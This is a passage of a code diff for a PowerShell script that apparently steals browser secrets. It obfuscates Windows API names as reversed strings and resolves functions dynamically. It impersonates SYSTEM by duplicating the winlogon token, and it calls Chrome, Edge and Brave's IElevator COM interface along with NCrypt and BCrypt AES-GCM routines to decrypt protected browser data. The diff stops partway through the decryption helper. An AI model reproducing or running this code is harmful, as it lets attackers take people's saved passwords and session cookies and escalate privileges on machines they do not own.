@@ -2,11 +2,8 @@ try { Add-Type -AssemblyName System.Security } catch {}
 
 function Invoke-FunctionLookup {
     Param (
-        [Parameter(Position = 0, Mandatory = $true)] 
-        [string] $moduleName,
-
-        [Parameter(Position = 1, Mandatory = $true)] 
-        [string] $functionName
+        [Parameter(Position = 0, Mandatory = $true)] [string] $moduleName,
+        [Parameter(Position = 1, Mandatory = $true)] [string] $functionName
     )
 
     $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $X1 }).GetType($X2)
@@ -27,20 +24,15 @@ function Invoke-FunctionLookup {
 
 function Invoke-GetDelegate {
     Param (
-        [Parameter(Position = 0, Mandatory = $true)] 
-        [Type[]] $parameterTypes,
-
-        [Parameter(Position = 1, Mandatory = $false)] 
-        [Type] $returnType = [Void]
+        [Parameter(Position = 0, Mandatory = $true)] [Type[]] $parameterTypes,
+        [Parameter(Position = 1, Mandatory = $false)] [Type] $returnType = [Void]
     )
 
     $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
         (New-Object System.Reflection.AssemblyName($N1)),
         [System.Reflection.Emit.AssemblyBuilderAccess]::Run
     )
-
     $moduleBuilder = $assemblyBuilder.DefineDynamicModule($N2, $false)
-
     $typeBuilder = $moduleBuilder.DefineType(
         $N3, 
         [System.Reflection.TypeAttributes]::Class -bor 
@@ -50,7 +42,6 @@ function Invoke-GetDelegate {
         [System.Reflection.TypeAttributes]::AutoClass, 
         [System.MulticastDelegate]
     )
-
     $constructorBuilder = $typeBuilder.DefineConstructor(
         [System.Reflection.MethodAttributes]::RTSpecialName -bor 
         [System.Reflection.MethodAttributes]::HideBySig -bor 
@@ -58,12 +49,10 @@ function Invoke-GetDelegate {
         [System.Reflection.CallingConventions]::Standard,
         $parameterTypes
     )
-
     $constructorBuilder.SetImplementationFlags(
         [System.Reflection.MethodImplAttributes]::Runtime -bor 
         [System.Reflection.MethodImplAttributes]::Managed
     )
-
     $methodBuilder = $typeBuilder.DefineMethod(
         'Invoke',
         [System.Reflection.MethodAttributes]::Public -bor 
@@ -73,107 +62,73 @@ function Invoke-GetDelegate {
         $returnType,
         $parameterTypes
     )
-
     $methodBuilder.SetImplementationFlags(
         [System.Reflection.MethodImplAttributes]::Runtime -bor 
         [System.Reflection.MethodImplAttributes]::Managed
     )
-
     return $typeBuilder.CreateType()
 }
-
 
 $X1 = ([regex]::Matches("lld.metsyS", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
 $X2 = ([regex]::Matches("sdohteMevitaNefasnU.23niW.tfosorciM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
 $X3 = ([regex]::Matches("sserddAcorPteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
 $X4 = ([regex]::Matches("eldnaHeludoMteG", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
-
 $N1 = ([regex]::Matches("etageleDdetcelfeR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
 $N2 = ([regex]::Matches("eludoMyromeMnI", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
 $N3 = ([regex]::Matches("epyTetageleDyM", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
 
 # ======================================================================
-# Load Library Function
+# Load Libraries
 # ======================================================================
 $LoadLibraryADelegate = Invoke-GetDelegate -ParameterTypes @([string]) -ReturnType ([IntPtr])
 $LoadLibraryAFunctionPointer = Invoke-FunctionLookup -ModuleName "kernel32.dll" -FunctionName "LoadLibraryA"
-
-$LoadLibraryA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    $LoadLibraryAFunctionPointer,
-    $LoadLibraryADelegate
-)
-
-# ======================================================================
-# Winsqlite3.dll Function Pointers
-# ======================================================================
+$LoadLibraryA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAFunctionPointer, $LoadLibraryADelegate)
 
 $LibraryHandle = $LoadLibraryA.Invoke("winsqlite3.dll")
+if ($LibraryHandle -eq [IntPtr]::Zero) { Write-Output "[-] Failed to load winsqlite3.dll"; return }
 
-if ($LibraryHandle -eq [IntPtr]::Zero) {
-    return "[-] Failed to load winsqlite3.dll"
-}
-
+# SQLite functions
 $Sqlite3OpenV2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_open_v2'),
     (Invoke-GetDelegate @([string], [IntPtr].MakeByRefType(), [int], [IntPtr]) ([int])))
-
 $Sqlite3Close = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_close'),
     (Invoke-GetDelegate @([IntPtr]) ([int])))
-
 $Sqlite3PrepareV2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_prepare_v2'),
     (Invoke-GetDelegate @([IntPtr], [string], [int], [IntPtr].MakeByRefType(), [IntPtr]) ([int])))
-
 $Sqlite3Step = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_step'),
     (Invoke-GetDelegate @([IntPtr]) ([int])))
-
 $Sqlite3ColumnText = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_text'),
     (Invoke-GetDelegate @([IntPtr], [int]) ([IntPtr])))
-
 $Sqlite3ColumnBlob = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_blob'),
     (Invoke-GetDelegate @([IntPtr], [int]) ([IntPtr])))
-
 $Sqlite3ColumnByte = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_column_bytes'),
     (Invoke-GetDelegate @([IntPtr], [int]) ([int])))
-
-$Sqlite3ErrMsg = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_errmsg'),
-    (Invoke-GetDelegate @([IntPtr]) ([IntPtr])))
-
 $Sqlite3Finalize = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'winsqlite3.dll' -FunctionName 'sqlite3_finalize'),
     (Invoke-GetDelegate @([IntPtr]) ([int])))
 
-
-# ======================================================================
-# Token Handling Function Pointers
-# ======================================================================
-
+# Token functions
 $OpenProcessFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'Kernel32.dll' -FunctionName 'OpenProcess'),
     (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])))
-
 $OpenProcessTokenFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'OpenProcessToken'),
     (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([bool])))
-
 $DuplicateTokenExFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'DuplicateTokenEx'),
     (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([bool])))
-
 $ImpersonateLoggedOnUserFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'ImpersonateLoggedOnUser'),
     (Invoke-GetDelegate @([IntPtr]) ([bool])))
-
-
-# ======================================================================
-# Simple P/Invoke (Advapi32)
-# ======================================================================
+$CloseHandleFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (Invoke-FunctionLookup -ModuleName 'kernel32.dll' -FunctionName 'CloseHandle'),
+    (Invoke-GetDelegate @([IntPtr]) ([bool])))
 
 Add-Type -TypeDefinition @"
 using System;
@@ -184,231 +139,274 @@ public static class Advapi32 {
 }
 "@
 
-
-# ======================================================================
-# NCrypt.dll Function Pointers
-# ======================================================================
-
+# NCrypt functions
 $LibraryHandle = $LoadLibraryA.Invoke("ncrypt.dll")
-
-if ($LibraryHandle -eq [IntPtr]::Zero) {
-    return "[-] Failed to load ncrypt.dll"
-}
-
-
 $NCryptOpenStorageProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenStorageProvider'),
     (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [int]) ([int])))
-
 $NCryptOpenKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenKey'),
     (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [int]) ([int])))
-
 $NCryptDecryptFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptDecrypt'),
     (Invoke-GetDelegate @([IntPtr], [byte[]], [int], [IntPtr], [byte[]], [int], [Int32].MakeByRefType(), [uint32]) ([int])))
-
 $NCryptFreeObjectFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptFreeObject'),
     (Invoke-GetDelegate @([IntPtr]) ([int])))
 
-
-# ======================================================================
-# Kernel32.dll Function Pointers
-# ======================================================================
-
-$CloseHandleFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Invoke-FunctionLookup -ModuleName 'kernel32.dll' -FunctionName 'CloseHandle'),
-    (Invoke-GetDelegate @([IntPtr]) ([bool])))
-    
-# ======================================================================
-# BCrypt.dll Function Pointers
-# ======================================================================
-
+# BCrypt functions
 $LibraryHandle = $LoadLibraryA.Invoke("bcrypt.dll")
-
-if ($LibraryHandle -eq [IntPtr]::Zero) {
-    return "[-] Failed to load bcrypt.dll"
-}
-
 $BCryptOpenAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptOpenAlgorithmProvider'),
     (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [IntPtr], [int]) ([int])))
-
 $BCryptSetPropertyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptSetProperty'),
     (Invoke-GetDelegate @([IntPtr], [IntPtr], [IntPtr], [int], [int]) ([int])))
-
 $BCryptGenerateSymmetricKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptGenerateSymmetricKey'),
     (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [byte[]], [int], [int]) ([int])))
-
 $BCryptDecryptFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDecrypt'),
     (Invoke-GetDelegate @([IntPtr], [IntPtr], [int], [IntPtr], [IntPtr], [int], [IntPtr], [int], [Int32].MakeByRefType(), [int]) ([int])))
-
 $BCryptDestroyKeyFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDestroyKey'),
     (Invoke-GetDelegate @([IntPtr]) ([int])))
-
 $BCryptCloseAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptCloseAlgorithmProvider'),
     (Invoke-GetDelegate @([IntPtr], [int]) ([int])))
+
+# ======================================================================
+# IElevator COM Interface for Chrome 130+ (flag 33)
+# ======================================================================
+$IElevatorCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+[ComImport]
+[Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")]
+[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+public interface IElevator
+{
+    void QueryInterface();
+    void AddRef();
+    void Release();
+    
+    [PreserveSig]
+    int RunRecoveryCRXElevated(
+        [MarshalAs(UnmanagedType.LPWStr)] string crx_path,
+        [MarshalAs(UnmanagedType.LPWStr)] string browser_appid,
+        [MarshalAs(UnmanagedType.LPWStr)] string browser_version,
+        [MarshalAs(UnmanagedType.LPWStr)] string session_id,
+        uint caller_proc_id,
+        out ulong proc_handle);
+    
+    [PreserveSig]
+    int EncryptData(
+        ProtectionLevel protection_level,
+        [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_UI1)] byte[] plaintext,
+        [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_UI1)] out byte[] ciphertext,
+        out uint last_error);
+    
+    [PreserveSig]
+    int DecryptData(
+        [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_UI1)] byte[] ciphertext,
+        [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_UI1)] out byte[] plaintext,
+        out uint last_error);
+}
+
+public enum ProtectionLevel
+{
+    PROTECTION_NONE = 0,
+    PROTECTION_PATH_VALIDATION = 1,
+    PROTECTION_MAX = 2
+}
+
+public static class ChromeElevator
+{
+    // Chrome CLSID
+    public static readonly Guid CLSID_CHROME = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
+    // Edge CLSID
+    public static readonly Guid CLSID_EDGE = new Guid("1FCBE96C-1697-43AF-9140-2897C7C69767");
+    // Brave CLSID
+    public static readonly Guid CLSID_BRAVE = new Guid("576B31AF-6369-4B6B-8560-E4B203A97A8B");
+    
+    [DllImport("ole32.dll")]
+    private static extern int CoCreateInstance(
+        ref Guid clsid,
+        IntPtr pUnkOuter,
+        uint dwClsContext,
+        ref Guid riid,
+        out IntPtr ppv);
+    
+    public static byte[] DecryptWithElevator(byte[] ciphertext, string browser)
+    {
+        Guid clsid;
+        switch (browser.ToLower())
+        {
+            case "edge":
+                clsid = CLSID_EDGE;
+                break;
+            case "brave":
+                clsid = CLSID_BRAVE;
+                break;
+            default:
+                clsid = CLSID_CHROME;
+                break;
+        }
+        
+        Guid iid = new Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C");
+        IntPtr pElevator;
+        
+        int hr = CoCreateInstance(ref clsid, IntPtr.Zero, 4, ref iid, out pElevator);
+        if (hr != 0)
+        {
+            throw new COMException("Failed to create IElevator instance", hr);
+        }
+        
+        try
+        {
+            IElevator elevator = (IElevator)Marshal.GetObjectForIUnknown(pElevator);
+            byte[] plaintext;
+            uint lastError;
+            
+            hr = elevator.DecryptData(ciphertext, out plaintext, out lastError);
+            if (hr != 0)
+            {
+                throw new COMException("DecryptData failed", hr);
+            }
+            
+            return plaintext;
+        }
+        finally
+        {
+            Marshal.Release(pElevator);
+        }
+    }
+}
+"@
+
+try {
+    Add-Type -TypeDefinition $IElevatorCode -ErrorAction SilentlyContinue
+} catch {}
 
 # ======================================================================
 # Helper Functions
 # ======================================================================
 
 function Invoke-Impersonate {
-    $ProcessHandle          = [IntPtr]::Zero
-    $TokenHandle            = [IntPtr]::Zero
-    $DuplicateTokenHandle   = [IntPtr]::Zero
+    $ProcessHandle = [IntPtr]::Zero
+    $TokenHandle = [IntPtr]::Zero
+    $DuplicateTokenHandle = [IntPtr]::Zero
 
     $CurrentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
     if ($CurrentSid -eq 'S-1-5-18') { return $true }
 
-    $WinlogonProcessId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
-    $ProcessHandle = $OpenProcessFunction.Invoke(0x400, $true, [int]$WinlogonProcessId)
-    if ($ProcessHandle -eq [IntPtr]::Zero) { return $false }
-
-    $TokenHandle = [IntPtr]::Zero
-    if (-not $OpenProcessTokenFunction.Invoke($ProcessHandle, 0x0E, [ref]$TokenHandle)) { return $false }
-
-    $DuplicateTokenHandle = [IntPtr]::Zero
-    if (-not $DuplicateTokenExFunction.Invoke($TokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$DuplicateTokenHandle)) {
-        return $false
-    }
-
     try {
+        $WinlogonProcessId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
+        $ProcessHandle = $OpenProcessFunction.Invoke(0x400, $true, [int]$WinlogonProcessId)
+        if ($ProcessHandle -eq [IntPtr]::Zero) { return $false }
+
+        $TokenHandle = [IntPtr]::Zero
+        if (-not $OpenProcessTokenFunction.Invoke($ProcessHandle, 0x0E, [ref]$TokenHandle)) { return $false }
+
+        $DuplicateTokenHandle = [IntPtr]::Zero
+        if (-not $DuplicateTokenExFunction.Invoke($TokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$DuplicateTokenHandle)) {
+            return $false
+        }
+
         if (-not $ImpersonateLoggedOnUserFunction.Invoke($DuplicateTokenHandle)) { return $false }
         $NewSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
         return ($NewSid -eq 'S-1-5-18')
     }
-    catch {
-        return $false
-    }
+    catch { return $false }
     finally {
         if ($DuplicateTokenHandle -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($DuplicateTokenHandle) }
-        if ($TokenHandle          -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($TokenHandle)          } 
-        if ($ProcessHandle        -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($ProcessHandle)        }
+        if ($TokenHandle -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($TokenHandle) } 
+        if ($ProcessHandle -ne [IntPtr]::Zero) { [void]$CloseHandleFunction.Invoke($ProcessHandle) }
     }
 }
 
-function Parse-ChromeKeyBlob {
-    param([byte[]]$BlobData)
-
-    $CurrentOffset = 0
-    $HeaderLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
-    $CurrentOffset += 4
-    $HeaderBytes = $BlobData[$CurrentOffset..($CurrentOffset + $HeaderLength - 1)]
-    $CurrentOffset += $HeaderLength
-    $ContentLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
-    $CurrentOffset += 4
-
-    if (($HeaderLength + $ContentLength + 8) -ne $BlobData.Length) {
-        throw "Length mismatch"
+function HexToBytes {
+    param([string]$HexString)
+    $ByteArray = New-Object byte[] ($HexString.Length / 2)
+    for ($i = 0; $i -lt $ByteArray.Length; $i++) {
+        $ByteArray[$i] = [System.Convert]::ToByte($HexString.Substring($i * 2, 2), 16)
     }
+    return $ByteArray
+}
 
-    $EncryptionFlag = $BlobData[$CurrentOffset]
-    $CurrentOffset += 1
-
-    $ParseResult = @{
-        Header          = $HeaderBytes
-        Flag            = $EncryptionFlag
-        Iv              = $null
-        Ciphertext      = $null  
-        Tag             = $null
-        EncryptedAesKey = $null
-    }
-
-    if ($EncryptionFlag -eq 1 -or $EncryptionFlag -eq 2) {
-        $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
-        $CurrentOffset += 12
-        $ParseResult.Ciphertext = $BlobData[$CurrentOffset..($CurrentOffset + 31)] 
-        $CurrentOffset += 32
-        $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
-    }
-    elseif ($EncryptionFlag -eq 3) {
-        $ParseResult.EncryptedAesKey = $BlobData[$CurrentOffset..($CurrentOffset + 31)]
-        $CurrentOffset += 32
-        $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
-        $CurrentOffset += 12
-        $ParseResult.Ciphertext = $BlobData[$CurrentOffset..($CurrentOffset + 31)]
-        $CurrentOffset += 32  
-        $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
-    }
-    else {
-        throw "Unsupported flag: $EncryptionFlag"
-    }
-
-    return New-Object PSObject -Property $ParseResult
+function XorBytes {
+    param([byte[]]$a, [byte[]]$b)
+    if ($a.Length -ne $b.Length) { throw "Length mismatch" }
+    $result = New-Object byte[] $a.Length
+    for ($i = 0; $i -lt $a.Length; $i++) { $result[$i] = $a[$i] -bxor $b[$i] }
+    return $result
 }
 
 function DecryptWithAesGcm {
     param([byte[]]$Key, [byte[]]$Iv, [byte[]]$Ciphertext, [byte[]]$Tag)
 
     $AlgorithmHandle = [IntPtr]::Zero
-    $KeyHandle       = [IntPtr]::Zero
+    $KeyHandle = [IntPtr]::Zero
 
     try {
-        $AlgorithmIdPointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("AES")
-        $Status = $BCryptOpenAlgorithmProviderFunction.Invoke([ref]$AlgorithmHandle, $AlgorithmIdPointer, [IntPtr]::Zero, 0)
-        [Runtime.InteropServices.Marshal]::FreeHGlobal($AlgorithmIdPointer)
-        if ($Status -ne 0) { throw "BCryptOpenAlgorithmProvider failed: 0x$('{0:X8}' -f $Status)" }
+        $AlgPtr = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("AES")
+        $Status = $BCryptOpenAlgorithmProviderFunction.Invoke([ref]$AlgorithmHandle, $AlgPtr, [IntPtr]::Zero, 0)
+        [Runtime.InteropServices.Marshal]::FreeHGlobal($AlgPtr)
+        if ($Status -ne 0) { throw "BCryptOpenAlgorithmProvider failed" }
 
-        $PropertyNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingMode")
-        $PropertyValuePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingModeGCM")
-        $Status = $BCryptSetPropertyFunction.Invoke($AlgorithmHandle, $PropertyNamePointer, $PropertyValuePointer, 32, 0)
-        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyNamePointer)
-        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyValuePointer)
-        if ($Status -ne 0) { throw "BCryptSetProperty failed: 0x$('{0:X8}' -f $Status)" }
+        $PropName = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingMode")
+        $PropVal = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingModeGCM")
+        $Status = $BCryptSetPropertyFunction.Invoke($AlgorithmHandle, $PropName, $PropVal, 32, 0)
+        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropName)
+        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropVal)
+        if ($Status -ne 0) { throw "BCryptSetProperty failed" }
 
         $Status = $BCryptGenerateSymmetricKeyFunction.Invoke($AlgorithmHandle, [ref]$KeyHandle, [IntPtr]::Zero, 0, $Key, $Key.Length, 0)
-        if ($Status -ne 0) { throw "BCryptGenerateSymmetricKey failed: 0x$('{0:X8}' -f $Status)" }
+        if ($Status -ne 0) { throw "BCryptGenerateSymmetricKey failed" }
 
-        $CiphertextLength = $Ciphertext.Length
-        $PlaintextLength = $CiphertextLength
+        $CipherLen = $Ciphertext.Length
+        $PlainLen = $CipherLen
 
-        $IvPointer = [Runtime.InteropServices.Marshal]::AllocHGlobal($Iv.Length)
-        $CiphertextPointer = [Runtime.InteropServices.Marshal]::AllocHGlobal($CiphertextLength)
-        $TagPointer = [Runtime.InteropServices.Marshal]::AllocHGlobal($Tag.Length)
-        $PlaintextPointer = [Runtime.InteropServices.Marshal]::AllocHGlobal($PlaintextLength)
+        $IvPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($Iv.Length)
+        $CipherPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($CipherLen)
+        $TagPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($Tag.Length)
+        $PlainPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($PlainLen)
 
-        [Runtime.InteropServices.Marshal]::Copy($Iv, 0, $IvPointer, $Iv.Length)
-        [Runtime.InteropServices.Marshal]::Copy($Ciphertext, 0, $CiphertextPointer, $CiphertextLength)
-        [Runtime.InteropServices.Marshal]::Copy($Tag, 0, $TagPointer, $Tag.Length)
+        [Runtime.InteropServices.Marshal]::Copy($Iv, 0, $IvPtr, $Iv.Length)
+        [Runtime.InteropServices.Marshal]::Copy($Ciphertext, 0, $CipherPtr, $CipherLen)
+        [Runtime.InteropServices.Marshal]::Copy($Tag, 0, $TagPtr, $Tag.Length)
 
         $AuthInfoSize = 96
-        $AuthInfoPointer = [Runtime.InteropServices.Marshal]::AllocHGlobal($AuthInfoSize)
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 0, $AuthInfoSize)
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 4, 1)
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 8, $IvPointer.ToInt64())
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 16, $Iv.Length)
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 24, 0)
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 32, 0)
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 40, $TagPointer.ToInt64())
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 48, $Tag.Length)
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 56, 0)
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 64, 0)
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 68, 0)
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 72, 0)
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 80, 0)
+        $AuthInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($AuthInfoSize)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 0, $AuthInfoSize)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 4, 1)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 8, $IvPtr.ToInt64())
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 16, $Iv.Length)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 24, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 32, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 40, $TagPtr.ToInt64())
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 48, $Tag.Length)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 56, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 64, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 68, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPtr, 72, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPtr, 80, 0)
 
-        [int]$ResultLength = 0
-        $Status = $BCryptDecryptFunction.Invoke($KeyHandle, $CiphertextPointer, $CiphertextLength, $AuthInfoPointer, [IntPtr]::Zero, 0, $PlaintextPointer, $PlaintextLength, [ref]$ResultLength, 0)
+        [int]$ResultLen = 0
+        $Status = $BCryptDecryptFunction.Invoke($KeyHandle, $CipherPtr, $CipherLen, $AuthInfoPtr, [IntPtr]::Zero, 0, $PlainPtr, $PlainLen, [ref]$ResultLen, 0)
+        if ($Status -ne 0) { throw "BCryptDecrypt failed" }
 
-        if ($Status -ne 0) { throw "BCryptDecrypt failed: 0x$('{0:X8}' -f $Status)" }
-
-        $PlaintextBytes = New-Object byte[] $ResultLength
-        [Runtime.InteropServices.Marshal]::Copy($PlaintextPointer, $PlaintextBytes, 0, $ResultLength)
-        return $PlaintextBytes
+        $PlainBytes = New-Object byte[] $ResultLen
+        [Runtime.InteropServices.Marshal]::Copy($PlainPtr, $PlainBytes, 0, $ResultLen)
+        return $PlainBytes
     }
     finally {
-        if ($AuthInfoPointer)   { [Runtime.InteropServices.Marshal]::FreeHGlobal($AuthInfoPointer) }
-        if ($PlaintextPointer)  { [Runtime.InteropServices.Marshal]::FreeHGlobal($PlaintextPointer) }
-        if ($CiphertextPointer) { [Runtime.InteropServices.Marshal]::FreeHGlobal($CiphertextPointer) }
-        if ($TagPointer)        { [Runtime.InteropServices.Marshal]::FreeHGlobal($TagPointer) }
-        if ($IvPointer)         { [Runtime.InteropServices.Marshal]::FreeHGlobal($IvPointer) }
+        if ($AuthInfoPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($AuthInfoPtr) }
+        if ($PlainPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($PlainPtr) }
+        if ($CipherPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($CipherPtr) }
+        if ($TagPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($TagPtr) }
+        if ($IvPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($IvPtr) }
